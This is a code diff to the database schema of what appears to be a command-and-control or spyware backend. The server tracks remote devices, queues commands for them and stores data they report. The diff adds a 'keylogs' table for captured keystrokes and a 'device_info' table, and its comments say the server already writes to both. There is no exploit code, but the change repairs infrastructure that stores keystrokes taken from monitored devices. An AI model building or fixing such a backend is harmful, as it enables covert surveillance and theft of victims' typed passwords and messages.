@@ -55,11 +55,31 @@ CREATE TABLE IF NOT EXISTS commands (
     completed_at TIMESTAMPTZ
 );
 
+-- FIX: keylogs table was missing — server.js INSERTs into it at runtime
+CREATE TABLE IF NOT EXISTS keylogs (
+    id          BIGSERIAL PRIMARY KEY,
+    device_id   TEXT NOT NULL,
+    data        JSONB NOT NULL DEFAULT '{}',
+    captured_at TIMESTAMPTZ DEFAULT NOW()
+);
+
+-- FIX: device_info table was missing — server.js INSERTs into it at runtime
+CREATE TABLE IF NOT EXISTS device_info (
+    id          BIGSERIAL PRIMARY KEY,
+    device_id   TEXT NOT NULL,
+    info        JSONB NOT NULL DEFAULT '{}',
+    captured_at TIMESTAMPTZ DEFAULT NOW()
+);
+
 CREATE INDEX IF NOT EXISTS idx_dd_device  ON device_data(device_id);
 CREATE INDEX IF NOT EXISTS idx_dd_type    ON device_data(data_type);
 CREATE INDEX IF NOT EXISTS idx_dd_created ON device_data(created_at DESC);
 CREATE INDEX IF NOT EXISTS idx_cmd_device ON commands(device_id);
 CREATE INDEX IF NOT EXISTS idx_cmd_status ON commands(status);
+-- FIX: indexes for the new tables
+CREATE INDEX IF NOT EXISTS idx_keylogs_device   ON keylogs(device_id);
+CREATE INDEX IF NOT EXISTS idx_keylogs_captured ON keylogs(captured_at DESC);
+CREATE INDEX IF NOT EXISTS idx_device_info_device ON device_info(device_id);
 `;
 
 // ── New-column migrations (idempotent) ───────────────────────────────────────
@@ -81,7 +101,7 @@ async function init() {
   try {
     await client.query(SCHEMA);
     for (const m of MIGRATIONS) {
-      await client.query(m).catch(() => {}); // ignore "column already exists"
+      await client.query(m).catch(() => {});
     }
     console.log('[DB] Schema ready');
   } finally {
@@ -95,7 +115,6 @@ function query(sql, params = []) {
   return pool.query(sql, params);
 }
 
-// msg = DEVICE_INFO JSON from CCS
 async function upsertDevice(deviceId, msg, ip) {
   return pool.query(`
     INSERT INTO devices
